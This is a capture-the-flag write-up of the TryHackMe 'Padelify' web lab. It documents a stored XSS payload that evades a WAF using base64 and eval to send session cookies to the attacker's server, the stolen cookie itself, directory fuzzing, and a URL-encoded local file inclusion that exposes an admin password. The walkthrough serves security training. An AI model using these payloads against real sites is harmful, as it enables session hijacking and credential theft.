---
title: "TryHackMe: Padelify"
author: mitcheka
categories: [TryHackMe]
tags: [waf, web, waf bypass, stored xss, lfi ]
render_with_liquid: false
media_subpath: /images/tryhackme-padelify/
image:
  path: padel.webp
---

Exploitation of `Cross-site Scripting(XSS)` vulnerability and `WAF` bypass to capture the `moderator` user's cookie which we used to login to the application and obtain the first flag.
We get an endpoint with a configuration file after fuzzing the web application.A `file disclosure` vulnerability is how we read the config file contents thus obtaining admin password and subsequent second flag retrieval.

![card index](padel-card.webp){: width="300" height="300" }

## Initial Enumeration
### Nmap scan

```console
$  nmap -sC -sV -vv -Pn -T4 -p- 10.81.165.40
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 62 OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 59:b2:2b:34:c9:04:fa:e3:6a:21:02:d0:ee:03:7a:73 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBAA1kCKe8yaNvitRGTWX+Zia/xbjw2FigXVYNS68CGfQs17t+D8RvehfGv3xnTP6XYUmXjeA2PMvFKIxawHGHW0=
|   256 25:0c:f4:36:b3:19:45:89:3f:7e:b4:ca:eb:08:f5:50 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAYVYt/efTH1y35iG94edY8h9T6lpSgkLZUcJ6ASXUXS
80/tcp open  http    syn-ack ttl 62 Apache httpd 2.4.58 ((Ubuntu))
|_http-server-header: Apache/2.4.58 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Padelify - Tournament Registration
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Webserver
Checking port 80 we get a registration form with a message **"Sign up and a moderator will approve your participation."**

![web 80 index](port-80.webp){: width="800" height="600" }

Upon clicking the **login** button in the header we are redirected to `/login.php` where a login form resides.

![login index](login-page.webp){: width="800" height="600" }

## Access as moderator
### XSS Discovery
Since our registration request is reviewed by a moderator we try a simple XSS payload as the username field.

```console
<img src=http://192.168.134.168/zoom.png />
```
Our webserver on the attackbox shows that it works

```console
$ python3 -m http.server 80  
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.81.165.40 - - [03/Jan/2026 18:30:41] code 404, message File not found
10.81.165.40 - - [03/Jan/2026 18:30:41] "GET /zoom.png HTTP/1.1" 404 -
10.81.165.40 - - [03/Jan/2026 18:30:46] code 404, message File not found
10.81.165.40 - - [03/Jan/2026 18:30:46] "GET /zoom.png HTTP/1.1" 404 -
```

## Bypassing WAF
The nmap scan shows that the `httponly` flag for the `PHPSESSID` cookie is not set so we try to steal the moderators cookie with this payload.

```console
<img src=x onerror=fetch("http://192.168.134.168/?c="+document.cookie) />
```
But however the payload gets blocked by the `WAF` .

![payload index](img-register.webp){: width="800" height="600" }

After further tests we determine the `img` tag with `onerror` attribute seems to be flagged by the WAF so instead we try the `body` tag with the `onload` attribute which is not blocked.

![onload index](burp-onload.webp){: width="800" height="600" }

Based on the response the payload seems to be the problem.Using `eval` and `atob` we try passing our cookie-steal payload as base64 encoded to bypass the WAF.
Converting the payload to base64
```console
$ echo -n 'fetch("http://192.168.134.168/?c="+document.cookie)' | base64 -w0
ZmV0Y2goImh0dHA6Ly8xOTIuMTY4LjEzNC4xNjgvP2M9Iitkb2N1bWVudC5jb29raWUp 
```
The modification of the XSS payload.

```console
<body onload=eval(atob("ZmV0Y2goImh0dHA6Ly8xOTIuMTY4LjEzNC4xNjgvP2M9Iitkb2N1bWVudC5jb29raWUp")) />
```

Submitting this as our username we successfully bypass the WAF.
![burp index](burp-b64.webp){: width="800" height="600" }

From our attackbox webserver the payload executed and we get the moderators cookie

```console
$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80) ...
 10.81.165.40 - - [03/Jan/2026 18:40:26] "GET /?c=PHPSESSID=q47ci29c4tcpqj3ojj4b1n9bi5 HTTP/1.1" 200 -
 ```
 
 Replacing our `PHPSESSID`  with the captured cookie .
 
 ![cookie index](cookie.webp){: width="800" height="600" }
 
 Refreshing the page we are now logged in as the moderator and also capture our first flag.
 
 ![moderator index](moderator.webp){: width="800" height="600" }
 
 ## Access as Admin
 ### Configuration file
The moderator doesn't have any additional functionality so we fuzz the web application for more endpoints revealing `/logs` endpoint.

```console
$ ffuf -u 'http://10.81.165.40/FUZZ' -w ~/SecLists-master/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-small.txt -mc all -e .php,/ -ic -t 100 -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0' -fc 404
...
logs                    [Status: 301, Size: 311, Words: 20, Lines: 10, Duration: 242ms]
```

The logs endpoint has directory indexing with one file present `error.log`

![logs index](logs.webp){: width="800" height="600" }

Opening the file we see a file location `/var/www/html/config/app.conf`

![logs2 index](logs2.webp){: width="800" height="600" }

Typing the `/config/app.conf` directly we see the request is blocked by the WAF.

![waf index](config1.webp){: width="800" height="600" }

### File Disclosure
Not being able to access the config directly I do more enumeration checking the **Live** button in the header which redirects us to `/live.php?page=match.php`

![live1 index](live.webp){: width="800" height="600" }

Testing the `page` parameter with `/live.php?page=footer.php` we confirm we are able to include other files.

![param index](footer.webp){: width="800" height="600" }

If we try to include the config file the WAF blocks it again.
Next I try to bypass the WAF by url-encoding the `config/app.conf` value and we can see that it passes and we get the configuration file which also has the admin password.

![conf index](config-conf.webp){: width="800" height="600" }

Logging in to the application as the admin user with the discovered credentials we are able to access the admin dashboard and our second flag.

![admin index](admin.webp){: width="800" height="600" }

`GAME,SET,MATCH!!!`
<style>
.center img {        
  display:block;
  margin-left:auto;
  margin-right:auto;
}
.wrap pre{
    white-space: pre-wrap;
}

</style>
